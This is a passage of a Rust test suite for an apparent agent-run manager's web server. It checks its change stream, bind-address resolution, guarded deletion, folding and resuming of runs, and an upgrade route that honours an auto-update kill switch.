        // Read until the first event arrives rather than to end of stream: the
        // stream is endless by design, which is the point of the route.
        let mut seen = String::new();
        let mut buf = [0u8; 1024];
        while !seen.contains("event: change") {
            let read = tokio::time::timeout(Duration::from_secs(5), socket.read(&mut buf))
                .await
                .expect("the stream must speak within five seconds")
                .expect("read");
            assert!(read > 0, "the server closed the change stream: {seen}");
            seen.push_str(&String::from_utf8_lossy(&buf[..read]));
        }

        assert!(
            seen.to_lowercase()
                .contains("content-type: text/event-stream"),
            "the browser only reconnects automatically for a real SSE stream: {seen}"
        );
        let data = seen
            .lines()
            .find_map(|l| l.strip_prefix("data:"))
            .expect("a data line");
        let payload: Value = serde_json::from_str(data.trim()).expect("json payload");
        assert!(
            payload["queue_rev"].is_u64()
                && payload["runs_rev"].is_u64()
                && payload["questions_rev"].is_u64()
                && payload["talks_rev"].is_u64()
                && payload["loop_rev"].is_u64(),
            "the client needs one revision per store to know what to refetch, \
             and `talks_rev` is the only notification a standing talk gets - a \
             phone whose radio slept through a turn learns about it here, as \
             does one whose operator started the loop from another device: \
             {payload}"
        );

        // The front end re-polls health on a timer and on wake, and takes the
        // revisions from that answer whenever the stream is not up. So health
        // has to carry every key the stream carries: a phone on a link that
        // will not hold an SSE connection is exactly the phone that must still
        // notice a question, and a missing key there is not a 500 but a UI
        // that quietly stops updating.
        let health = f.get("/api/health").await.json();
        for key in [
            "queue_rev",
            "runs_rev",
            "questions_rev",
            "talks_rev",
            "loop_rev",
        ] {
            assert!(
                health[key].is_u64(),
                "health is the change stream's fallback and is missing `{key}`: {health}"
            );
        }
    }

    #[tokio::test]
    async fn a_new_turn_on_a_talk_moves_the_change_stream_revision() {
        let f = Fixture::start().await;
        let before = f.get("/api/health").await.json()["talks_rev"]
            .as_u64()
            .expect("talks_rev");

        let talk = seed_talk(&f, "20260904-014455-ab12", "open");
        std::thread::sleep(Duration::from_millis(10));
        let mut on_disk = f.talks().get(&talk).expect("get seeded talk");
        on_disk.turns.push(crate::talk::Turn {
            who: crate::talk::Who::Operator,
            body: "a new turn".to_owned(),
            at: Timestamp::now(),
            attachments: Vec::new(),
        });
        f.talks().put(&mut on_disk).expect("record a turn");

        let after = f.get("/api/health").await.json()["talks_rev"]
            .as_u64()
            .expect("talks_rev");
        assert_ne!(
            before, after,
            "a phone must be able to notice a talk's reply without polling every store"
        );
    }

    #[test]
    fn bind_reads_back_from_the_spelling_the_cli_prints() {
        // The CLI shows the default in `--help` and parses whatever comes
        // back, so the two directions have to agree or `--bind auto` breaks
        // the moment someone copies the help text.
        for bind in [Bind::Auto, Bind::Addr(IpAddr::V4(Ipv4Addr::LOCALHOST))] {
            assert_eq!(bind.to_string().parse::<Bind>(), Ok(bind));
        }
        assert_eq!("AUTO".parse::<Bind>(), Ok(Bind::Auto));
        assert!("everywhere".parse::<Bind>().is_err());
    }

    #[test]
    fn an_explicit_bind_address_is_taken_verbatim() {
        let asked = IpAddr::V4(Ipv4Addr::new(192, 168, 1, 20));

        let (addr, warning) = resolve_bind(&Bind::Addr(asked));

        assert_eq!(addr, asked);
        assert!(
            warning.is_none(),
            "an operator who named an address gets no lecture"
        );
    }

    #[test]
    fn bind_auto_either_finds_a_tailnet_address_or_says_the_ui_is_local_only() {
        let (addr, warning) = resolve_bind(&Bind::Auto);

        // This has to hold on a CI runner with no `tailscale` and on a dev box
        // with one, so the invariant asserted is the one shared by both
        // outcomes: the address is either a real tailnet address offered
        // without comment, or loopback with an explanation. What must never
        // happen is a silent fallback - an operator told "listening on
        // 127.0.0.1" with no reason would go looking for a firewall.
        match addr {
            IpAddr::V4(ip) if is_tailnet(&ip) => {
                assert!(warning.is_none(), "a tailnet address needs no warning");
            }
            other => {
                assert_eq!(other, IpAddr::V4(Ipv4Addr::LOCALHOST));
                let warning = warning.expect("a fallback has to explain itself");
                assert!(
                    warning.contains("127.0.0.1") && warning.contains("local-only"),
                    "the warning says what happened and what it costs: {warning}"
                );
            }
        }
    }

    #[test]
    fn only_the_cgnat_block_counts_as_a_tailnet_address() {
        // `tailscale ip -4` output is trusted only inside 100.64.0.0/10; the
        // boundary cases are what stop us binding to some other tool's idea of
        // an address.
        assert!(is_tailnet(&Ipv4Addr::new(100, 64, 0, 1)));
        assert!(is_tailnet(&Ipv4Addr::new(100, 127, 255, 254)));
        assert!(!is_tailnet(&Ipv4Addr::new(100, 63, 255, 255)));
        assert!(!is_tailnet(&Ipv4Addr::new(100, 128, 0, 1)));
        assert!(!is_tailnet(&Ipv4Addr::new(127, 0, 0, 1)));
    }

    #[test]
    fn an_ambiguous_prefix_is_a_bad_request_and_a_missing_one_is_not_found() {
        let ids = vec![
            "20260902-140501-aaaa".to_owned(),
            "20260902-140502-aabb".to_owned(),
        ];

        let missing = pick(ids.clone(), "zzzz", "run").expect_err("no match");
        let ambiguous = pick(ids.clone(), "202609", "run").expect_err("two matches");
        let short = pick(ids, "aabb", "run").expect("the short id is the tail of an id");

        assert_eq!(missing.status, StatusCode::NOT_FOUND);
        assert_eq!(ambiguous.status, StatusCode::BAD_REQUEST);
        assert_eq!(short, "20260902-140502-aabb");
    }
    #[tokio::test]
    async fn a_panel_reaches_its_assets_by_the_bare_name_it_was_told_to_use() {
        // The prompt tells agents to reference attachments by bare filename.
        // A document served at `.../panel` resolves `shot.png` against its own
        // directory, i.e. `.../shot.png`, which is not the asset route - so a
        // panel written exactly as instructed showed broken images. Caught by
        // looking at a real one in a browser, not by reading the code.
        let fx = Fixture::start().await;
        let id = panel(
            &fx,
            "<img src=\"shot.png\">",
            &[("shot.png", b"\x89PNG\r\n\x1a\n")],
        );

        // The frame's own URL ends in a filename, so its siblings are reachable.
        let doc = fx
            .get(&format!("/api/questions/{id}/panel/index.html"))
            .await;
        assert_eq!(doc.status, 200, "{}", doc.body);
        assert_eq!(doc.header("content-type"), Some("text/html; charset=utf-8"));

        let sibling = fx.get(&format!("/api/questions/{id}/panel/shot.png")).await;
        assert_eq!(sibling.status, 200, "{}", sibling.body);
        assert_eq!(sibling.header("content-type"), Some("image/png"));
        assert_eq!(
            sibling.header("content-security-policy"),
            Some(PANEL_CSP),
            "the sibling route must carry the same policy as the asset route"
        );

        // The original spelling keeps working: HEAD on it is how the front end
        // decides whether to mount a frame at all.
        assert_eq!(
            fx.head(&format!("/api/questions/{id}/panel")).await.status,
            200
        );
    }

    #[test]
    fn runs_revision_moves_when_deleting_an_older_run() {
        let temp = TempDir::new().expect("tempdir");
        let runs = temp.path().join("runs");
        std::fs::create_dir_all(&runs).expect("create runs dir");

        assert_eq!(runs_revision(&runs), 0, "empty runs has 0 revision");

        write_run(&runs, "20260901-100000-old1", RunStatus::Merged);
        std::thread::sleep(Duration::from_millis(10));
        write_run(&runs, "20260902-100000-new2", RunStatus::Merged);

        let rev_before = runs_revision(&runs);
        assert!(rev_before > 0);

        let old_dir = runs.join("20260901-100000-old1");
        std::fs::remove_dir_all(&old_dir).expect("remove old run");

        let rev_after = runs_revision(&runs);
        assert_ne!(
            rev_before, rev_after,
            "deleting an older run must change the revision so other clients see the deletion"
        );
    }

    /// A run's own `run.json` on an explicit `runs` root, bypassing the
    /// process-global home entirely — `RunState::save` writes through
    /// `run::home()`, whose `set_home` is a `OnceLock` no unit test may touch
    /// (see `tests::home_lock` in the integration suite for why).
    fn write_state(runs: &FsPath, state: &RunState) {
        let dir = runs.join(&state.id);
        std::fs::create_dir_all(&dir).expect("run dir");
        std::fs::write(
            dir.join("run.json"),
            serde_json::to_string_pretty(state).expect("serialize run"),
        )
        .expect("write run.json");
    }

    /// A seat starting or finishing is a write to `run.json` like any other,
    /// so it moves the same revision the change stream already watches —
    /// nothing new for `/api/events` to learn, but the property this feature
    /// depends on to reach the phone without a poll.
    #[test]
    fn runs_revision_moves_when_a_seat_starts_and_again_when_it_finishes() {
        let temp = TempDir::new().expect("tempdir");
        let runs = temp.path().join("runs");
        std::fs::create_dir_all(&runs).expect("create runs dir");
        let mut state = RunState::new(
            PathBuf::from("/repo/magi"),
            "main".to_owned(),
            "0123456789abcdef".to_owned(),
            "task".to_owned(),
            Config::default(),
        );
        state.id = "20260902-100000-c0de".to_owned();
        write_state(&runs, &state);

        let rev_idle = runs_revision(&runs);
        std::thread::sleep(Duration::from_millis(10));
        state.seat_started("judge", "judge-1", std::time::Duration::from_secs(60), 0);
        write_state(&runs, &state);
        let rev_started = runs_revision(&runs);
        assert_ne!(
            rev_idle, rev_started,
            "a seat starting must move the revision"
        );

        std::thread::sleep(Duration::from_millis(10));
        state.seat_finished("judge-1");
        write_state(&runs, &state);
        let rev_finished = runs_revision(&runs);
        assert_ne!(
            rev_started, rev_finished,
            "and clearing it again must move the revision a second time"
        );
    }

    #[tokio::test]
    async fn delete_queue_task_deletes_file_and_guards_running_and_locked() {
        let fx = Fixture::start().await;
        let q = fx.queue();

        // 1. A queued task with runs attached can be deleted.
        let mut t1 = Task::new(
            "Task 1".to_owned(),
            "Instruction 1".to_owned(),
            PathBuf::from("/repo"),
            Source::Human,
        );
        let run_id = "20260901-000000-r111";
        t1.runs.push(run_id.to_owned());
        write_run(&fx.runs(), run_id, RunStatus::Merged);
        q.put(&mut t1).expect("put t1");

        // Delete by short id
        let res = fx.delete(&format!("/api/queue/{}", t1.short())).await;
        assert_eq!(res.status, 204);
        assert!(res.body.is_empty(), "204 No Content has no body");
        assert!(!q.path_of(&t1.id).exists(), "task file is deleted");
        assert!(
            fx.runs().join(run_id).exists(),
            "run directory must not be deleted when its task is deleted"
        );

        // 2. A task a live daemon is running is refused with 409.
        let mut t2 = Task::new(
            "Task 2".to_owned(),
            "Instruction 2".to_owned(),
            PathBuf::from("/repo"),
            Source::Human,
        );
        t2.status = TaskStatus::Running;
        q.put(&mut t2).expect("put t2");
        let mut beat = crate::daemon::Status::new();
        beat.current = vec![crate::daemon::Current {
            task: t2.id.clone(),
            run: "20260901-000000-r222".to_owned(),
        }];
        beat.updated_at = jiff::Timestamp::now();
        crate::daemon::write_status_to(&fx.home.path().join("daemon.json"), &beat)
            .expect("publish a heartbeat");
        let res = fx.delete(&format!("/api/queue/{}", t2.id)).await;
        assert_eq!(res.status, 409);
        assert!(
            res.json()["error"]
                .as_str()
                .unwrap()
                .contains("live daemon")
        );
        assert!(q.path_of(&t2.id).exists(), "a task in flight is kept");

        // 3. The same `running` status and an orphaned lock, with no daemon
        // behind either, is a leftover and deletable. Before this the phone
        // refused it for good: the status never changes on its own and
        // nothing drops a lock whose process is gone.
        // The daemon is killed: the file stays, the heartbeat stops.
        beat.updated_at = jiff::Timestamp::now() - jiff::SignedDuration::from_secs(600);
        crate::daemon::write_status_to(&fx.home.path().join("daemon.json"), &beat)
            .expect("leave a stale heartbeat");
        let mut t3 = Task::new(
            "Task 3".to_owned(),
            "Instruction 3".to_owned(),
            PathBuf::from("/repo"),
            Source::Human,
        );
        t3.status = TaskStatus::Running;
        q.put(&mut t3).expect("put t3");
        std::mem::forget(q.claim(&t3.id).expect("claim t3"));
        let res = fx.delete(&format!("/api/queue/{}", t3.id)).await;
        assert_eq!(res.status, 204);
        assert!(!q.path_of(&t3.id).exists(), "the task file is gone");
        assert!(
            q.claim(&t3.id).is_ok(),
            "the stale lock went with it, so the id is claimable again"
        );

        // 4. Missing id returns 404
        let res = fx.delete("/api/queue/nonexistent").await;
        assert_eq!(res.status, 404);
    }

    #[tokio::test]
    async fn delete_run_deletes_directory_and_guards_running_and_unfolded() {
        let fx = Fixture::start().await;
        let runs = fx.runs();

        // 1. Finished and folded run can be deleted along with artifacts
        let run_id = "20260901-000000-fold";
        let mut state = RunState::new(
            PathBuf::from("/repo"),
            "main".to_owned(),
            "abc".to_owned(),
            "instruction".to_owned(),
            Config::default(),
        );
        state.id = run_id.to_owned();
        state.status = RunStatus::Merged;
        state.candidates.push(crate::run::Candidate {
            index: 0,
            label: 'A',
            agent: "a".to_owned(),
            branch: "b".to_owned(),
            worktree: PathBuf::from("/w"),
            summary: String::new(),
            stat: String::new(),
            files: 1,
            commits: 1,
            empty: false,
            failed: None,
            duration_ms: 0,
            folded: true,
        });
        let dir = runs.join(run_id);
        std::fs::create_dir_all(dir.join("artifacts")).expect("create artifacts");
        std::fs::write(dir.join("artifacts").join("patch.diff"), "dummy diff")
            .expect("write artifact");
        std::fs::write(dir.join("run.json"), serde_json::to_string(&state).unwrap())
            .expect("write run.json");

        // Delete by short id
        let res = fx.delete(&format!("/api/runs/{}", state.short())).await;
        assert_eq!(res.status, 204);
        assert!(res.body.is_empty(), "204 has no body");
        assert!(!dir.exists(), "run directory and artifacts must be deleted");

        // 2. A run a live daemon is working on is refused with 409. The
        // heartbeat is what makes it refusable: an unfinished run with no
        // daemon behind it is a leftover from a killed process, and case 1
        // above would otherwise be impossible to tell apart from this one.
        let run_running = "20260901-000000-rung";
        write_run(&runs, run_running, RunStatus::Prep);
        let mut beat = crate::daemon::Status::new();
        beat.current = vec![crate::daemon::Current {
            task: "20260901-000000-task".to_owned(),
            run: run_running.to_owned(),
        }];
        beat.updated_at = jiff::Timestamp::now();
        crate::daemon::write_status_to(&fx.home.path().join("daemon.json"), &beat)
            .expect("publish a heartbeat");
        let res = fx.delete(&format!("/api/runs/{run_running}")).await;
        assert_eq!(res.status, 409);
        assert!(
            res.json()["error"]
                .as_str()
                .unwrap()
                .contains("live daemon"),
            "the refusal must say who is holding it"
        );
        assert!(
            runs.join(run_running).exists(),
            "a run in flight keeps its directory"
        );

        // 3. Finished run with unfolded candidate is refused with 409 and mentions `magi fold`
        let run_unfolded = "20260901-000000-unfd";
        let mut state2 = RunState::new(
            PathBuf::from("/repo"),
            "main".to_owned(),
            "abc".to_owned(),
            "instruction".to_owned(),
            Config::default(),
        );
        state2.id = run_unfolded.to_owned();
        state2.status = RunStatus::Ready;
        state2.candidates.push(crate::run::Candidate {
            index: 0,
            label: 'A',
            agent: "a".to_owned(),
            branch: "b".to_owned(),
            worktree: PathBuf::from("/w"),
            summary: String::new(),
            stat: String::new(),
            files: 1,
            commits: 1,
            empty: false,
            failed: None,
            duration_ms: 0,
            folded: false,
        });
        let dir2 = runs.join(run_unfolded);
        std::fs::create_dir_all(&dir2).expect("create dir2");
        std::fs::write(
            dir2.join("run.json"),
            serde_json::to_string(&state2).unwrap(),
        )
        .expect("write run.json");

        let res = fx.delete(&format!("/api/runs/{run_unfolded}")).await;
        assert_eq!(res.status, 409);
        assert!(res.json()["error"].as_str().unwrap().contains("magi fold"));
        assert!(dir2.exists(), "unfolded run directory is kept");

        // 4. Missing id returns 404
        let res = fx.delete("/api/runs/nonexistent").await;
        assert_eq!(res.status, 404);
    }

    #[test]
    fn web_ui_delete_contract_in_front_end() {
        // 1. API block has both delete endpoints
        assert!(APP_JS.contains("deleteRun:"));
        assert!(APP_JS.contains("deleteTask:"));

        // 2. #runs-list card builder (createRunCard / updateRunCard) has no delete entry
        let run_cards_slice = &APP_JS[APP_JS.find("function createRunCard").unwrap()
            ..APP_JS.find("function renderRuns").unwrap()];
        assert!(!run_cards_slice.to_lowercase().contains("delete"));

        // 3. Run detail has delete entry and reasons
        assert!(APP_JS.contains("renderRunDelete"));
        assert!(APP_JS.contains("runDeleteReason"));
        assert!(APP_JS.contains("magi fold"));
        assert!(APP_JS.contains("This run is still in flight and cannot be deleted."));

        // 4. Two-step delete arming and focus on Cancel
        assert!(APP_JS.contains("cancel.focus"));
        assert!(APP_JS.contains("armedRunDelete"));
        assert!(APP_JS.contains("armedDelete"));

        // 5. Running task has disabled delete
        assert!(APP_JS.contains("disabled: status === \"running\""));
    }

    /// Every element a run card's updater reaches for must be in the `refs`
    /// the builder handed it.
    ///
    /// `createRunCard` builds its elements, appends them to the card, and then
    /// lists them again in `row.refs`. That second list is the one the updater
    /// uses, and nothing connects the two - an element can be built, appended
    /// and rendered, and still be missing from `refs`. `superseded` was, for
    /// two releases: `setText(r.superseded, ...)` threw on the first card, the
    /// exception took `syncList` with it, and the deck showed
    /// "13 runs, 2 in flight, 8 unreadable" above an empty list. The count
    /// line is computed before the cards, which is why the failure looked like
    /// a server that had lost its runs rather than a front end that had
    /// stopped rendering them.
    ///
    /// A `cargo test` cannot execute the front end, so this reads the two
    /// halves out of the source and compares them as sets. It is not a check
    /// on the wording of either list: adding an element, renaming one, or
    /// reordering them all keeps this passing, and only using one the builder
    /// never published fails it.
    #[test]
    fn every_ref_a_run_card_uses_is_one_its_builder_published() {
        let build = APP_JS
            .find("function createRunCard")
            .expect("createRunCard exists");
        let update = APP_JS
            .find("function updateRunCard")
            .expect("updateRunCard exists");
        let end = APP_JS
            .find("function renderRuns")
            .expect("renderRuns exists");

        // The builder's published set: the object literal assigned to `refs`.
        let builder = &APP_JS[build..update];
        let open = builder.find("refs = {").expect("createRunCard sets refs");
        let literal = &builder[open + "refs = {".len()..];
        let close = literal.find('}').expect("the refs literal is closed");
        let published: HashSet<&str> = literal[..close]
            .split(',')
            // `name` and `name: value` both bind `name`.
            .filter_map(|entry| entry.split(':').next())
            .map(str::trim)
            .filter(|name| !name.is_empty())
            .collect();
        assert!(
            published.len() > 5,
            "the refs literal did not parse into names: {published:?}"
        );

        // What the updaters reach for: every `r.<name>`, where `r` is the
        // `const r = row.refs` alias both functions open with.
        let mut used: Vec<&str> = Vec::new();
        let updaters = &APP_JS[update..end];
        for (at, _) in updaters.match_indices("r.") {
            // `r` must be the whole identifier, not the tail of another one
            // (`Number.parseFloat`, `pr.url`, `for.` and friends).
            let before = updaters[..at].chars().next_back();
            if before.is_some_and(|c| c.is_alphanumeric() || c == '_' || c == '$' || c == '.') {
                continue;
            }
            let rest = &updaters[at + 2..];
            let len = rest
                .find(|c: char| !(c.is_alphanumeric() || c == '_' || c == '$'))
                .unwrap_or(rest.len());
            if len > 0 {
                used.push(&rest[..len]);
            }
        }
        assert!(
            used.len() > 5,
            "no `r.<name>` uses were found; the updaters must have been rewritten: {used:?}"
        );

        let missing: Vec<&str> = used
            .iter()
            .copied()
            .filter(|name| !published.contains(name))
            .collect();
        assert!(
            missing.is_empty(),
            "a run card's updater reaches for {missing:?}, which `createRunCard` \
             never put in `refs` - every card will throw and the list will \
             render empty under a count line that says otherwise. Published: \
             {published:?}"
        );
    }

    #[tokio::test]
    async fn folding_from_the_phone_reports_what_it_removed() {
        let fx = Fixture::start().await;
        let runs = fx.runs();

        // A run with no candidates has nothing to fold, which is a 200 with an
        // honest count rather than an error: the operator asked for the trees
        // to be gone and they are.
        let id = "20260901-000000-fold";
        write_run(&runs, id, RunStatus::Stalled);
        let res = fx.post(&format!("/api/runs/{id}/fold"), None).await;
        assert_eq!(res.status, 200);
        assert_eq!(res.json()["removed_count"], 0);
        assert_eq!(res.json()["run"], id);
        assert!(
            runs.join(id).exists(),
            "a fold keeps the run's record; only the worktrees go"
        );
    }

    #[tokio::test]
    async fn folding_an_unreadable_run_falls_back_to_removing_it_wholesale() {
        let fx = Fixture::start().await;
        let runs = fx.runs();
        let wt = fx.home.path().join("wt").join("magi").join("dead");
        let id = "20260901-000000-dead";
        std::fs::create_dir_all(runs.join(id)).expect("run dir");
        std::fs::write(runs.join(id).join("run.json"), "not json").expect("garbage state");
        std::fs::create_dir_all(&wt).expect("worktree dir");

        let res = fx.post(&format!("/api/runs/{id}/fold"), None).await;
        assert_eq!(res.status, 200, "{}", res.body);
        assert!(
            res.json()["removed_count"].as_u64().unwrap() > 0,
            "the worktree this build could not read a state for still went"
        );
        assert!(
            !runs.join(id).exists(),
            "an unreadable run has no candidate list to fold selectively, so \
             the whole record goes - same as `magi fold` on the CLI"
        );
    }

    #[tokio::test]
    async fn deleting_an_unreadable_run_removes_it_wholesale() {
        let fx = Fixture::start().await;
        let runs = fx.runs();
        let wt = fx.home.path().join("wt").join("magi").join("gone");
        let id = "20260901-000000-gone";
        std::fs::create_dir_all(runs.join(id)).expect("run dir");
        std::fs::write(runs.join(id).join("run.json"), "not json").expect("garbage state");
        std::fs::create_dir_all(&wt).expect("worktree dir");

        let res = fx.delete(&format!("/api/runs/{id}")).await;
        assert_eq!(res.status, 204, "{}", res.body);
        assert!(!runs.join(id).exists(), "the broken record is gone");
        assert!(!wt.exists(), "its worktree is gone too");
    }

    #[tokio::test]
    async fn folding_is_refused_while_a_daemon_is_working_on_the_run() {
        let fx = Fixture::start().await;
        let runs = fx.runs();
        let id = "20260901-000000-live";
        write_run(&runs, id, RunStatus::Implementing);

        let mut beat = crate::daemon::Status::new();
        beat.current = vec![crate::daemon::Current {
            task: "20260901-000000-task".to_owned(),
            run: id.to_owned(),
        }];
        beat.updated_at = jiff::Timestamp::now();
        crate::daemon::write_status_to(&fx.home.path().join("daemon.json"), &beat)
            .expect("publish a heartbeat");

        let res = fx.post(&format!("/api/runs/{id}/fold"), None).await;
        assert_eq!(res.status, 409);
        assert!(
            res.json()["error"]
                .as_str()
                .unwrap()
                .contains("live daemon"),
            "folding under a running agent would pull its worktree away"
        );
    }

    #[tokio::test]
    async fn resume_is_refused_unless_the_run_stopped_somewhere_it_can_continue() {
        let fx = Fixture::start().await;
        let runs = fx.runs();

        // Only a finished run and a failed one. An *interrupted* run - a
        // parked one, or one whose daemon was killed mid-node - is the case
        // resuming exists for: run 4043 sat at `reviewing` with the deck
        // saying it could not be resumed, which was the one state where
        // resuming was the only sensible answer.
        for (status, word) in [
            (RunStatus::Merged, "merged"),
            (RunStatus::Ready, "ready"),
            (RunStatus::Failed, "failed"),
        ] {
            let id = format!("20260901-000000-{}", &word[..4]);
            write_run(&runs, &id, status);
            let res = fx.post(&format!("/api/runs/{id}/resume"), None).await;
            assert_eq!(res.status, 409, "{word} must not be resumable");
            let err = res.json()["error"].as_str().unwrap().to_owned();
            assert!(err.contains(word), "the refusal names the status: {err}");
        }

        // And an interrupted run is accepted: 202, with the resume running in
        // the background. `Runner::resume` fails immediately here - the
        // fixture's run points at a repository that does not exist - which is
        // the point: the handler must not wait for it to find out.
        let mid = "20260901-000000-midf";
        write_run(&runs, mid, RunStatus::Reviewing);
        let res = fx.post(&format!("/api/runs/{mid}/resume"), None).await;
        assert_eq!(res.status, 202, "an interrupted run is resumable");
    }

    #[tokio::test]
    async fn resume_is_refused_while_the_loop_is_running() {
        let fx = Fixture::start().await;
        let runs = fx.runs();
        let stalled = "20260901-000000-stal";
        write_run(&runs, stalled, RunStatus::Stalled);

        // The loop is busy with a *different* run, and that is still a
        // refusal: a manual resume must never race whatever the loop itself
        // is already driving, whether that is one run or several.
        let mut beat = crate::daemon::Status::new();
        beat.current = vec![crate::daemon::Current {
            task: "20260901-000000-task".to_owned(),
            run: "20260901-000000-othr".to_owned(),
        }];
        beat.updated_at = jiff::Timestamp::now();
        crate::daemon::write_status_to(&fx.home.path().join("daemon.json"), &beat)
            .expect("publish a heartbeat");

        let res = fx.post(&format!("/api/runs/{stalled}/resume"), None).await;
        assert_eq!(res.status, 409);
        let err = res.json()["error"].as_str().unwrap().to_owned();
        assert!(err.contains("othr"), "it names what the loop is on: {err}");
        assert!(err.contains("stop it first"), "{err}");
    }

    #[test]
    fn a_run_cannot_be_resumed_twice_at_once() {
        let home = TempDir::new().expect("temp home");
        let ui = Ui::new(
            Queue::at(home.path().join("queue")),
            Questions::at(home.path().join("questions")),
            Talks::at(home.path().join("talks")),
            home.path().join("runs"),
            home.path().to_path_buf(),
            PathBuf::from("/repo"),
        )
        .with_worktrees_root(home.path().join("wt"));
        let first = ui.begin_resume("20260901-000000-once").expect("claimed");
        let again = ui.begin_resume("20260901-000000-once");
        assert!(again.is_err(), "a second tap must not start a second graph");
        drop(first);
        assert!(
            ui.begin_resume("20260901-000000-once").is_ok(),
            "and the claim is released when the attempt ends"
        );
    }

    #[test]
    fn talk_thinking_tracks_only_its_held_turn_claim() {
        let home = TempDir::new().expect("temp home");
        let ui = Ui::new(
            Queue::at(home.path().join("queue")),
            Questions::at(home.path().join("questions")),
            Talks::at(home.path().join("talks")),
            home.path().join("runs"),
            home.path().to_path_buf(),
            PathBuf::from("/repo"),
        )
        .with_worktrees_root(home.path().join("wt"));
        let id = "20260901-000000-once";

        assert!(!ui.is_thinking(id), "an unclaimed talk is not thinking");
        let turn = ui.begin_talk_turn(id).expect("claim turn");
        assert!(ui.is_thinking(id), "the held guard is reported as thinking");
        assert!(
            !ui.is_thinking("20260901-000000-other"),
            "one talk's turn does not make another talk busy"
        );
        drop(turn);
        assert!(!ui.is_thinking(id), "dropping the guard releases thinking");
    }

    #[tokio::test]
    async fn an_upgrade_is_refused_when_the_loop_belongs_to_another_process() {
        let fx = Fixture::start().await;
        // Somebody else's `magi serve` owns the queue. Replacing this binary
        // would leave that process running an old one against the same
        // claims, which is worse than refusing.
        let mut beat = crate::daemon::Status::new();
        beat.pid = 4321;
        beat.updated_at = jiff::Timestamp::now();
        crate::daemon::write_status_to(&fx.home.path().join("daemon.json"), &beat)
            .expect("publish a heartbeat");

        let res = fx.post("/api/upgrade", None).await;
        assert_eq!(res.status, 409);
        let err = res.json()["error"].as_str().unwrap().to_owned();
        assert!(err.contains("4321"), "the refusal names the owner: {err}");
        assert!(err.contains("old one against the same queue"), "{err}");
    }

    /// [`should_spawn_recheck`] must refuse for the same two reasons
    /// [`Checker::new`](crate::updater::Checker::new) and `upgrade_post`
    /// already do: `mode = "off"` and the `MAGI_NO_AUTOUPDATE` kill switch.
    /// Purely a predicate over config and the environment - no network, no
    /// disk, no runtime - so unlike the fixture-based tests around it this
    /// one needs neither.
    #[test]
    fn recheck_never_spawns_when_checking_is_off_or_killed_by_env() {
        assert!(!should_spawn_recheck(&crate::config::Update {
            mode: UpdateMode::Off,
            interval: None,
        }));

        // SAFETY: single-threaded as far as this variable goes, the same
        // reasoning `updater::tests::env_kill_switch_semantics` relies on.
        unsafe {
            std::env::set_var(crate::updater::NO_AUTOUPDATE_ENV, "1");
        }
        let killed = should_spawn_recheck(&crate::config::Update {
            mode: UpdateMode::Notify,
            interval: None,
        });
        unsafe {
            std::env::remove_var(crate::updater::NO_AUTOUPDATE_ENV);
        }
        assert!(
            !killed,
            "MAGI_NO_AUTOUPDATE must stop the periodic recheck, not just the \
             one-time startup check"
        );

        assert!(should_spawn_recheck(&crate::config::Update {
            mode: UpdateMode::Notify,
            interval: None,
        }));
    }

    /// [`recheck_poll_period`] must track a configured `[update] interval`
    /// shorter than its own default ceiling - a fixed sleep here would leave
    /// an operator's short interval waiting on the next wake-up instead of on
    /// `should_check`, which is the same bug this whole task exists to fix,
    /// just one level down.
    #[test]
    fn recheck_poll_period_tracks_a_short_configured_interval() {
        let short = crate::config::Update {
            mode: UpdateMode::Notify,
            interval: Some("1m".to_owned()),
        };
        let period = recheck_poll_period(&short);
        assert!(
            period <= Duration::from_secs(30),
            "a one-minute interval must wake the task far sooner than the \
             default ceiling, or the deck would not notice within the \
             interval the operator configured: got {period:?}"
        );

        let default = crate::config::Update {
            mode: UpdateMode::Notify,
            interval: None,
        };
        assert_eq!(
            recheck_poll_period(&default),
            UPDATE_RECHECK_POLL_MAX,
            "the default day-long interval should poll at the (capped) \
             ceiling rather than needlessly often"
        );
    }

    /// [`update_recheck_due`] must not repeat a check made moments ago, the
    /// same throttle `updater::Checker::should_check` already gives the
    /// CLI's notify mode. Built over an explicit state file via
    /// `Checker::for_test`, never `Checker::new`, so this cannot read or
    /// write the operator's real `last_update_check.json` - and therefore
    /// cannot flake on whatever that file happens to say on the machine
    /// running the test.
    #[test]
    fn recheck_skips_the_network_before_the_interval_elapses() {
        let dir = TempDir::new().expect("temp dir");
        let path = dir.path().join("state.json");
        let state = kaishin::UpdateCheckState {
            last_checked_unix: jiff::Timestamp::now().as_second() as u64,
            last_known_latest: None,
            last_known_url: None,
        };
        kaishin::save_check_state(&path, &state).expect("seed a just-checked state");

        let checker = crate::updater::Checker::for_test(Duration::from_secs(24 * 60 * 60), path);
        assert!(
            !update_recheck_due(&checker, None),
            "a check made moments ago must not be repeated before the \
             configured interval elapses"
        );
    }

    /// An upgrade this deck already started must not be raced by a recheck
    /// that discovers a newer release mid-install - regardless of what
    /// `should_check` says, which is why the state file here is missing
    /// entirely: read alone, that alone would answer "never checked, go
    /// ahead".
    #[test]
    fn recheck_defers_to_an_upgrade_already_in_flight() {
        let dir = TempDir::new().expect("temp dir");
        let path = dir.path().join("state.json");
        let checker = crate::updater::Checker::for_test(Duration::from_secs(60 * 60), path);
        let progress = crate::updater::Progress::new("0.8.0".to_owned(), "v0.9.0".to_owned());

        assert!(
            !update_recheck_due(&checker, Some(&progress)),
            "a recheck must not run while an upgrade this deck started is \
             still moving"
        );
    }

    #[tokio::test]
    async fn an_upgrade_is_refused_by_the_no_autoupdate_kill_switch() {
        // The same env var the background check honours (`disabled_by_env`)
        // must also stop a button press before it ever calls
        // `Checker::newer_release` - an operator who set `MAGI_NO_AUTOUPDATE`
        // means "never contact GitHub from this process", and a tap on the
        // upgrade button must not override that any more than a broken
        // `magi.toml` may. Left unset, this fixture's default config would
        // otherwise reach a real, unauthenticated GitHub call.
        //
        // SAFETY: single-threaded as far as this variable goes - nothing else
        // in this binary reads `MAGI_NO_AUTOUPDATE` concurrently, the same
        // reasoning `updater::tests::env_kill_switch_semantics` relies on.
        unsafe {
            std::env::set_var(crate::updater::NO_AUTOUPDATE_ENV, "1");
        }
        let fx = Fixture::start().await;
        let res = fx.post("/api/upgrade", None).await;
        unsafe {
            std::env::remove_var(crate::updater::NO_AUTOUPDATE_ENV);
        }
        assert_eq!(res.status, 200, "not 202: nothing was set in motion");
        let body = res.json();
        assert!(body["to"].is_null(), "there was no release to move to");
        assert!(body["parked"].is_null(), "and nothing was parked");
        assert!(
            body["detail"]
                .as_str()
                .unwrap()
                .contains("disabled by MAGI_NO_AUTOUPDATE"),
            "{body:?}"
        );
    }

    #[tokio::test]
    async fn an_upgrade_with_nothing_to_install_changes_nothing() {
